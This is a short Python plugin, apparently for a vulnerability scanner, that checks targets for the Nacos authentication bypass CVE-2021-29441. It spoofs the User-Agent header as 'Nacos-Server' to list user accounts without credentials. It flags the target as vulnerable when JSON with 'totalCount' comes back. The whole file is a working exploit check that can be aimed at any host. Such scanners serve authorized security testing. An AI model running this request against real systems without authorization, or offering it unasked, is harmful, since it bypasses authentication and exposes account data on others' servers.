import requests

from xing.core.BasePlugin import BasePlugin
from xing.core import PluginType, SchemeType


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "Nacos 认证绕过漏洞 CVE-2021-29441"
        self.app_name = "Nacos"
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

    def verify(self, target):
        url = target + "/nacos/v1/auth/users/?pageNo=1&pageSize=999"
        content_type = ""
        body = ""
        try:
            r = requests.get(url, headers={"User-Agent": "Nacos-Server"}, verify=False)
            body = r.text
            content_type = r.headers["Content-Type"]
        except Exception:
            pass
        if "json" in content_type and "totalCount" in body:
            self.logger.success("CVE-2021-29441 {}".format(url))
            return url
